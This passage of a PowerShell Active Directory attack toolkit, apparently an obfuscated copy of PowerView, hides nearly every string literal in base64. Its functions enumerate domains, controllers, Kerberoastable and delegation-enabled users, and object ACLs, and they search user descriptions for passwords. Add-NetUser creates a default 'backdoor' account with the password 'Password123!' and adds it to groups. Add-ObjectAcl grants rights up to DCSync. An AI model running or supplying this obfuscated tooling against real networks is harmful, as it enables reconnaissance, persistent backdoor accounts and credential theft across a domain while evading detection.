            $SearchString = ""
        }
        else {
            if($ADSpath -like ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TERBUDovLyo=")))) {
                $ADSpath = $ADSpath.Substring(7)
            }
            $DistinguishedName = $ADSpath
        }
    }
    else {
        $DistinguishedName = (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("REM9ezB9"))) -f $($Domain.Replace(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Lg=="))), ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("LERDPQ=="))))))
    }

    $SearchString += $DistinguishedName
    Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R2V0LURvbWFpblNlYXJjaGVyIHNlYXJjaCBzdHJpbmc6ICRTZWFyY2hTdHJpbmc=")))

    $Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
    $Searcher.PageSize = $PageSize
    $Searcher
}


function Get-NetDomain {


    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $Domain
    )

    process {
        if($Domain) {
            $DomainContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu"))), $Domain)
            try {
                [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($DomainContext)
            }
            catch {
                Write-Warning ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VGhlIHNwZWNpZmllZCBkb21haW4gJERvbWFpbiBkb2VzIG5vdCBleGlzdCwgY291bGQgbm90IGJlIGNvbnRhY3RlZCwgb3IgdGhlcmUgaXNuJ3QgYW4gZXhpc3RpbmcgdHJ1c3Qu")))
                $Null
            }
        }
        else {
            [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
        }
    }
}


function Get-NetForest {


    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $Forest
    )

    process {
        if($Forest) {
            $ForestContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Rm9yZXN0"))), $Forest)
            try {
                $ForestObject = [System.DirectoryServices.ActiveDirectory.Forest]::GetForest($ForestContext)
            }
            catch {
                Write-Debug ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VGhlIHNwZWNpZmllZCBmb3Jlc3QgJEZvcmVzdCBkb2VzIG5vdCBleGlzdCwgY291bGQgbm90IGJlIGNvbnRhY3RlZCwgb3IgdGhlcmUgaXNuJ3QgYW4gZXhpc3RpbmcgdHJ1c3Qu")))
                $Null
            }
        }
        else {
            
            $ForestObject = [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()
        }

        if($ForestObject) {
            
            $ForestSid = (New-Object System.Security.Principal.NTAccount($ForestObject.RootDomain,([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("a3JidGd0"))))).Translate([System.Security.Principal.SecurityIdentifier]).Value
            $Parts = $ForestSid -Split ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("LQ==")))
            $ForestSid = $Parts[0..$($Parts.length-2)] -join ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("LQ==")))
            $ForestObject | Add-Member NoteProperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Um9vdERvbWFpblNpZA=="))) $ForestSid
            $ForestObject
        }
    }
}


function Get-NetForestDomain {


    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $Forest,

        [String]
        $Domain
    )

    process {
        if($Domain) {
            
            if($Domain.Contains(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Kg=="))))) {
                (Get-NetForest -Forest $Forest).Domains | Where-Object {$_.Name -like $Domain}
            }
            else {
                
                (Get-NetForest -Forest $Forest).Domains | Where-Object {$_.Name.ToLower() -eq $Domain.ToLower()}
            }
        }
        else {
            
            $ForestObject = Get-NetForest -Forest $Forest
            if($ForestObject) {
                $ForestObject.Domains
            }
        }
    }
}


function Get-NetForestCatalog {


    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $Forest
    )

    process {
        $ForestObject = Get-NetForest -Forest $Forest
        if($ForestObject) {
            $ForestObject.FindAllGlobalCatalogs()
        }
    }
}


function Get-NetDomainController {


    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $Domain,

        [String]
        $DomainController,

        [Switch]
        $LDAP
    )

    process {
        if($LDAP -or $DomainController) {
            
            Get-NetComputer -Domain $Domain -DomainController $DomainController -FullData -Filter ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KHVzZXJBY2NvdW50Q29udHJvbDoxLjIuODQwLjExMzU1Ni4xLjQuODAzOj04MTkyKQ==")))
        }
        else {
            $FoundDomain = Get-NetDomain -Domain $Domain
            
            if($FoundDomain) {
                $Founddomain.DomainControllers
            }
        }
    }
}








function Get-NetUser {


    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $UserName,

        [String]
        $Domain,

        [String]
        $DomainController,

        [String]
        $ADSpath,

        [String]
        $Filter,

        [Switch]
        $SPN,

        [Switch]
        $AdminCount,

        [Switch]
        $Unconstrained,

        [Switch]
        $AllowDelegation,

        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200
    )

    begin {
        
        $UserSearcher = Get-DomainSearcher -Domain $Domain -ADSpath $ADSpath -DomainController $DomainController -PageSize $PageSize
    }

    process {
        if($UserSearcher) {

            
            if($Unconstrained) {
                Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q2hlY2tpbmcgZm9yIHVuY29uc3RyYWluZWQgZGVsZWdhdGlvbg==")))
                $Filter += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KHVzZXJBY2NvdW50Q29udHJvbDoxLjIuODQwLjExMzU1Ni4xLjQuODAzOj01MjQyODgp")))
            }
            if($AllowDelegation) {
                Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q2hlY2tpbmcgZm9yIHVzZXJzIHdobyBjYW4gYmUgZGVsZWdhdGVk")))
                
                $Filter += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KCEodXNlckFjY291bnRDb250cm9sOjEuMi44NDAuMTEzNTU2LjEuNC44MDM6PTEwNDg1NzQpKQ==")))
            }
            if($AdminCount) {
                Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q2hlY2tpbmcgZm9yIGFkbWluQ291bnQ9MQ==")))
                $Filter += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KGFkbWluY291bnQ9MSk=")))
            }

            
            if($UserName) {
                
                $UserSearcher.filter=([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KCYoc2FtQWNjb3VudFR5cGU9ODA1MzA2MzY4KShzYW1BY2NvdW50TmFtZT0kVXNlck5hbWUpJEZpbHRlcik=")))
            }
            elseif($SPN) {
                $UserSearcher.filter=([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KCYoc2FtQWNjb3VudFR5cGU9ODA1MzA2MzY4KShzZXJ2aWNlUHJpbmNpcGFsTmFtZT0qKSRGaWx0ZXIp")))
            }
            else {
                
                $UserSearcher.filter=([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KCYoc2FtQWNjb3VudFR5cGU9ODA1MzA2MzY4KSRGaWx0ZXIp")))
            }

            $UserSearcher.FindAll() | Where-Object {$_} | ForEach-Object {
                
                Convert-LDAPProperty -Properties $_.Properties
            }
        }
    }
}


function Add-NetUser {


    [CmdletBinding()]
    Param (
        [ValidateNotNullOrEmpty()]
        [String]
        $UserName = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("YmFja2Rvb3I="))),

        [ValidateNotNullOrEmpty()]
        [String]
        $Password = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UGFzc3dvcmQxMjMh"))),

        [ValidateNotNullOrEmpty()]
        [String]
        $GroupName,

        [ValidateNotNullOrEmpty()]
        [Alias('HostName')]
        [String]
        $ComputerName = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("bG9jYWxob3N0"))),

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain
    )

    if ($Domain) {

        $DomainObject = Get-NetDomain -Domain $Domain
        if(-not $DomainObject) {
            Write-Warning ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RXJyb3IgaW4gZ3JhYmJpbmcgJERvbWFpbiBvYmplY3Q=")))
            return $Null
        }

        
        Add-Type -AssemblyName System.DirectoryServices.AccountManagement

        
        
        $Context = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::Domain), $DomainObject

        
        $User = New-Object -TypeName System.DirectoryServices.AccountManagement.UserPrincipal -ArgumentList $Context

        
        $User.Name = $UserName
        $User.SamAccountName = $UserName
        $User.PasswordNotRequired = $False
        $User.SetPassword($Password)
        $User.Enabled = $True

        Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlYXRpbmcgdXNlciAkVXNlck5hbWUgdG8gd2l0aCBwYXNzd29yZCAnJFBhc3N3b3JkJyBpbiBkb21haW4gJERvbWFpbg==")))

        try {
            
            $User.Save()
            ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("WypdIFVzZXIgJFVzZXJOYW1lIHN1Y2Nlc3NmdWxseSBjcmVhdGVkIGluIGRvbWFpbiAkRG9tYWlu")))
        }
        catch {
            Write-Warning ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("WyFdIFVzZXIgYWxyZWFkeSBleGlzdHMh")))
            return
        }
    }
    else {
        
        Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlYXRpbmcgdXNlciAkVXNlck5hbWUgdG8gd2l0aCBwYXNzd29yZCAnJFBhc3N3b3JkJyBvbiAkQ29tcHV0ZXJOYW1l")))

        
        $ObjOu = [ADSI]([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("V2luTlQ6Ly8kQ29tcHV0ZXJOYW1l")))
        $ObjUser = $ObjOu.Create(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VXNlcg=="))), $UserName)
        $ObjUser.SetPassword($Password)

        
        try {
            $Null = $ObjUser.SetInfo()
            ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("WypdIFVzZXIgJFVzZXJOYW1lIHN1Y2Nlc3NmdWxseSBjcmVhdGVkIG9uIGhvc3QgJENvbXB1dGVyTmFtZQ==")))
        }
        catch {
            Write-Warning ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("WyFdIEFjY291bnQgYWxyZWFkeSBleGlzdHMh")))
            return
        }
    }

    
    if ($GroupName) {
        
        if ($Domain) {
            Add-NetGroupUser -UserName $UserName -GroupName $GroupName -Domain $Domain
            ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("WypdIFVzZXIgJFVzZXJOYW1lIHN1Y2Nlc3NmdWxseSBhZGRlZCB0byBncm91cCAkR3JvdXBOYW1lIGluIGRvbWFpbiAkRG9tYWlu")))
        }
        
        else {
            Add-NetGroupUser -UserName $UserName -GroupName $GroupName -ComputerName $ComputerName
            ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("WypdIFVzZXIgJFVzZXJOYW1lIHN1Y2Nlc3NmdWxseSBhZGRlZCB0byBncm91cCAkR3JvdXBOYW1lIG9uIGhvc3QgJENvbXB1dGVyTmFtZQ==")))
        }
    }
}


function Add-NetGroupUser {


    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $UserName,

        [Parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $GroupName,

        [ValidateNotNullOrEmpty()]
        [Alias('HostName')]
        [String]
        $ComputerName,

        [String]
        $Domain
    )

    
    Add-Type -AssemblyName System.DirectoryServices.AccountManagement

    
    if($ComputerName -and ($ComputerName -ne ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("bG9jYWxob3N0"))))) {
        try {
            Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QWRkaW5nIHVzZXIgJFVzZXJOYW1lIHRvICRHcm91cE5hbWUgb24gaG9zdCAkQ29tcHV0ZXJOYW1l")))
            ([ADSI]([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("V2luTlQ6Ly8kQ29tcHV0ZXJOYW1lLyRHcm91cE5hbWUsZ3JvdXA=")))).add(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("V2luTlQ6Ly8kQ29tcHV0ZXJOYW1lLyRVc2VyTmFtZSx1c2Vy"))))
            ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("WypdIFVzZXIgJFVzZXJOYW1lIHN1Y2Nlc3NmdWxseSBhZGRlZCB0byBncm91cCAkR3JvdXBOYW1lIG9uICRDb21wdXRlck5hbWU=")))
        }
        catch {
            Write-Warning ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("WyFdIEVycm9yIGFkZGluZyB1c2VyICRVc2VyTmFtZSB0byBncm91cCAkR3JvdXBOYW1lIG9uICRDb21wdXRlck5hbWU=")))
            return
        }
    }

    
    else {
        try {
            if ($Domain) {
                Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QWRkaW5nIHVzZXIgJFVzZXJOYW1lIHRvICRHcm91cE5hbWUgb24gZG9tYWluICREb21haW4=")))
                $CT = [System.DirectoryServices.AccountManagement.ContextType]::Domain
                $DomainObject = Get-NetDomain -Domain $Domain
                if(-not $DomainObject) {
                    return $Null
                }
                
                $Context = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList $CT, $DomainObject            
            }
            else {
                
                Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QWRkaW5nIHVzZXIgJFVzZXJOYW1lIHRvICRHcm91cE5hbWUgb24gbG9jYWxob3N0")))
                $Context = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Machine, $Env:ComputerName)
            }

            
            $Group = [System.DirectoryServices.AccountManagement.GroupPrincipal]::FindByIdentity($Context,$GroupName)

            
            $Group.Members.add($Context, [System.DirectoryServices.AccountManagement.IdentityType]::SamAccountName, $UserName)

            
            $Group.Save()
        }
        catch {
            Write-Warning (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RXJyb3IgYWRkaW5nICRVc2VyTmFtZSB0byAkR3JvdXBOYW1lIDogezB9"))) -f $_)
        }
    }
}


function Get-UserProperty {


    [CmdletBinding()]
    param(
        [String[]]
        $Properties,

        [String]
        $Domain,
        
        [String]
        $DomainController,

        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200
    )

    if($Properties) {
        
        $Properties = ,([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("bmFtZQ=="))) + $Properties
        Get-NetUser -Domain $Domain -DomainController $DomainController -PageSize $PageSize | Select-Object -Property $Properties
    }
    else {
        
        Get-NetUser -Domain $Domain -DomainController $DomainController -PageSize $PageSize | Select-Object -First 1 | Get-Member -MemberType *Property | Select-Object -Property ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TmFtZQ==")))
    }
}


function Find-UserField {


    [CmdletBinding()]
    param(
        [Parameter(Position=0,ValueFromPipeline=$True)]
        [String]
        $SearchTerm = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("cGFzcw=="))),

        [String]
        $SearchField = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZGVzY3JpcHRpb24="))),

        [String]
        $ADSpath,

        [String]
        $Domain,

        [String]
        $DomainController,

        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200
    )

    process {
        Get-NetUser -ADSpath $ADSpath -Domain $Domain -DomainController $DomainController -Filter "($SearchField=*$SearchTerm*)" -PageSize $PageSize | Select-Object samaccountname,$SearchField
    }
}


function Get-UserEvent {


    Param(
        [String]
        $ComputerName = $Env:ComputerName,

        [String]
        [ValidateSet("logon","tgt","all")]
        $EventType = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("bG9nb24="))),

        [DateTime]
        $DateStart=[DateTime]::Today.AddDays(-5)
    )

    if($EventType.ToLower() -like ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("bG9nb24=")))) {
        [Int32[]]$ID = @(4624)
    }
    elseif($EventType.ToLower() -like ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("dGd0")))) {
        [Int32[]]$ID = @(4768)
    }
    else {
        [Int32[]]$ID = @(4624, 4768)
    }

    
    Get-WinEvent -ComputerName $ComputerName -FilterHashTable @{ LogName = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VjdXJpdHk="))); ID=$ID; StartTime=$DateStart} -ErrorAction SilentlyContinue | ForEach-Object {

        if($ID -contains 4624) {    
            
            if($_.message -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KD9zKSg/PD1Mb2dvbiBUeXBlOikuKj8oPz0oSW1wZXJzb25hdGlvbiBMZXZlbDp8TmV3IExvZ29uOikp")))) {
                if($Matches) {
                    $LogonType = $Matches[0].trim()
                    $Matches = $Null
                }
            }
            else {
                $LogonType = ""
            }

            
            if (($LogonType -eq 2) -or ($LogonType -eq 3)) {
                try {
                    
                    if($_.message -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KD9zKSg/PD1OZXcgTG9nb246KS4qPyg/PVByb2Nlc3MgSW5mb3JtYXRpb246KQ==")))) {
                        if($Matches) {
                            $UserName = $Matches[0].split("" + "`n" + "")[2].split(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Og=="))))[1].trim()
                            $Domain = $Matches[0].split("" + "`n" + "")[3].split(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Og=="))))[1].trim()
                            $Matches = $Null
                        }
                    }
                    if($_.message -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KD9zKSg/PD1OZXR3b3JrIEluZm9ybWF0aW9uOikuKj8oPz1Tb3VyY2UgUG9ydDop")))) {
                        if($Matches) {
                            $Address = $Matches[0].split("" + "`n" + "")[2].split(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Og=="))))[1].trim()
                            $Matches = $Null
                        }
                    }

                    
                    if ($UserName -and (-not $UserName.endsWith(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("JA=="))))) -and ($UserName -ne ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QU5PTllNT1VTIExPR09O"))))) {
                        $LogonEventProperties = @{
                            ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu"))) = $Domain
                            ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tcHV0ZXJOYW1l"))) = $ComputerName
                            ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VXNlcm5hbWU="))) = $UserName
                            ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QWRkcmVzcw=="))) = $Address
                            ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SUQ="))) = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("NDYyNA==")))
                            ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TG9nb25UeXBl"))) = $LogonType
                            ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VGltZQ=="))) = $_.TimeCreated
                        }
                        New-Object -TypeName PSObject -Property $LogonEventProperties
                    }
                }
                catch {
                    Write-Debug (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RXJyb3IgcGFyc2luZyBldmVudCBsb2dzOiB7MH0="))) -f $_)
                }
            }
        }
        if($ID -contains 4768) {
            
            try {
                if($_.message -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KD9zKSg/PD1BY2NvdW50IEluZm9ybWF0aW9uOikuKj8oPz1TZXJ2aWNlIEluZm9ybWF0aW9uOik=")))) {
                    if($Matches) {
                        $Username = $Matches[0].split("" + "`n" + "")[1].split(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Og=="))))[1].trim()
                        $Domain = $Matches[0].split("" + "`n" + "")[2].split(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Og=="))))[1].trim()
                        $Matches = $Null
                    }
                }

                if($_.message -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KD9zKSg/PD1OZXR3b3JrIEluZm9ybWF0aW9uOikuKj8oPz1BZGRpdGlvbmFsIEluZm9ybWF0aW9uOik=")))) {
                    if($Matches) {
                        $Address = $Matches[0].split("" + "`n" + "")[1].split(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Og=="))))[-1].trim()
                        $Matches = $Null
                    }
                }

                $LogonEventProperties = @{
                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu"))) = $Domain
                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tcHV0ZXJOYW1l"))) = $ComputerName
                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VXNlcm5hbWU="))) = $UserName
                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QWRkcmVzcw=="))) = $Address
                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SUQ="))) = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("NDc2OA==")))
                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TG9nb25UeXBl"))) = ''
                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VGltZQ=="))) = $_.TimeCreated
                }

                New-Object -TypeName PSObject -Property $LogonEventProperties
            }
            catch {
                Write-Debug (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RXJyb3IgcGFyc2luZyBldmVudCBsb2dzOiB7MH0="))) -f $_)
            }
        }
    }
}


function Get-ObjectAcl {


    [CmdletBinding()]
    Param (
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $SamAccountName,

        [String]
        $Name = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Kg=="))),

        [Alias('DN')]
        [String]
        $DistinguishedName = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Kg=="))),

        [Switch]
        $ResolveGUIDs,

        [String]
        $Filter,

        [String]
        $ADSpath,

        [String]
        $ADSprefix,

        [String]
        [ValidateSet("All","ResetPassword","WriteMembers")]
        $RightsFilter,

        [String]
        $Domain,

        [String]
        $DomainController,

        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200
    )

    begin {
        $Searcher = Get-DomainSearcher -Domain $Domain -DomainController $DomainController -ADSpath $ADSpath -ADSprefix $ADSprefix -PageSize $PageSize

        
        if($ResolveGUIDs) {
            $GUIDs = Get-GUIDMap -Domain $Domain -DomainController $DomainController -PageSize $PageSize
        }
    }

    process {

        if ($Searcher) {

            if($SamAccountName) {
                $Searcher.filter=([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KCYoc2FtYWNjb3VudG5hbWU9JFNhbUFjY291bnROYW1lKShuYW1lPSROYW1lKShkaXN0aW5ndWlzaGVkbmFtZT0kRGlzdGluZ3Vpc2hlZE5hbWUpJEZpbHRlcik=")))  
            }
            else {
                $Searcher.filter=([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KCYobmFtZT0kTmFtZSkoZGlzdGluZ3Vpc2hlZG5hbWU9JERpc3Rpbmd1aXNoZWROYW1lKSRGaWx0ZXIp")))  
            }
  
            try {
                $Searcher.FindAll() | Where-Object {$_} | Foreach-Object {
                    $Object = [adsi]($_.path)
                    if($Object.distinguishedname) {
                        $Access = $Object.PsBase.ObjectSecurity.access
                        $Access | ForEach-Object {
                            $_ | Add-Member NoteProperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("T2JqZWN0RE4="))) ($Object.distinguishedname[0])

                            if($Object.objectsid[0]){
                                $S = (New-Object System.Security.Principal.SecurityIdentifier($Object.objectsid[0],0)).Value
                            }
                            else {
                                $S = $Null
                            }
                            
                            $_ | Add-Member NoteProperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("T2JqZWN0U0lE"))) $S
                            $_
                        }
                    }
                } | ForEach-Object {
                    if($RightsFilter) {
                        $GuidFilter = Switch ($RightsFilter) {
                            ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzZXRQYXNzd29yZA=="))) { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("MDAyOTk1NzAtMjQ2ZC0xMWQwLWE3NjgtMDBhYTAwNmUwNTI5"))) }
                            ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("V3JpdGVNZW1iZXJz"))) { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("YmY5Njc5YzAtMGRlNi0xMWQwLWEyODUtMDBhYTAwMzA0OWUy"))) }
                            Default { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("MDAwMDAwMDAtMDAwMC0wMDAwLTAwMDAtMDAwMDAwMDAwMDAw")))}
                        }
                        if($_.ObjectType -eq $GuidFilter) { $_ }
                    }
                    else {
                        $_
                    }
                } | Foreach-Object {
                    if($GUIDs) {
                        
                        $AclProperties = @{}
                        $_.psobject.properties | ForEach-Object {
                            if( ($_.Name -eq ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("T2JqZWN0VHlwZQ==")))) -or ($_.Name -eq ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SW5oZXJpdGVkT2JqZWN0VHlwZQ==")))) ) {
                                try {
                                    $AclProperties[$_.Name] = $GUIDS[$_.Value.toString()]
                                }
                                catch {
                                    $AclProperties[$_.Name] = $_.Value
                                }
                            }
                            else {
                                $AclProperties[$_.Name] = $_.Value
                            }
                        }
                        New-Object -TypeName PSObject -Property $AclProperties
                    }
                    else { $_ }
                }
            }
            catch {
                Write-Warning $_
            }
        }
    }
}


function Add-ObjectAcl {


    [CmdletBinding()]
    Param (
        [String]
        $TargetSamAccountName,

        [String]
        $TargetName = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Kg=="))),

        [Alias('DN')]
        [String]
        $TargetDistinguishedName = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Kg=="))),

        [String]
        $TargetFilter,

        [String]
        $TargetADSpath,

        [String]
        $TargetADSprefix,

        [String]
        [ValidatePattern('^S-1-5-21-[0-9]+-[0-9]+-[0-9]+-[0-9]+')]
        $PrincipalSID,

        [String]
        $PrincipalName,

        [String]
        $PrincipalSamAccountName,

        [String]
        [ValidateSet("All","ResetPassword","WriteMembers","DCSync")]
        $Rights = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QWxs"))),

        [String]
        $RightsGUID,

        [String]
        $Domain,

        [String]
        $DomainController,

        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200
    )

    begin {
        $Searcher = Get-DomainSearcher -Domain $Domain -DomainController $DomainController -ADSpath $TargetADSpath -ADSprefix $TargetADSprefix -PageSize $PageSize

        if(!$PrincipalSID) {
            $Principal = Get-ADObject -Domain $Domain -DomainController $DomainController -Name $PrincipalName -SamAccountName $PrincipalSamAccountName -PageSize $PageSize
            
            if(!$Principal) {
                throw ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RXJyb3IgcmVzb2x2aW5nIHByaW5jaXBhbA==")))
            }
            $PrincipalSID = $Principal.objectsid
        }
        if(!$PrincipalSID) {
            throw ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RXJyb3IgcmVzb2x2aW5nIHByaW5jaXBhbA==")))
        }
    }

    process {

        if ($Searcher) {

            if($TargetSamAccountName) {
                $Searcher.filter=([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KCYoc2FtYWNjb3VudG5hbWU9JFRhcmdldFNhbUFjY291bnROYW1lKShuYW1lPSRUYXJnZXROYW1lKShkaXN0aW5ndWlzaGVkbmFtZT0kVGFyZ2V0RGlzdGluZ3Vpc2hlZE5hbWUpJFRhcmdldEZpbHRlcik=")))  
            }
            else {
                $Searcher.filter=([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KCYobmFtZT0kVGFyZ2V0TmFtZSkoZGlzdGluZ3Vpc2hlZG5hbWU9JFRhcmdldERpc3Rpbmd1aXNoZWROYW1lKSRUYXJnZXRGaWx0ZXIp")))  
            }
  
            try {
                $Searcher.FindAll() | Where-Object {$_} | Foreach-Object {
                    

                    $TargetDN = $_.Properties.distinguishedname

                    $Identity = [System.Security.Principal.IdentityReference] ([System.Security.Principal.SecurityIdentifier]$PrincipalSID)
                    $InheritanceType = [System.DirectoryServices.ActiveDirectorySecurityInheritance] ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Tm9uZQ==")))
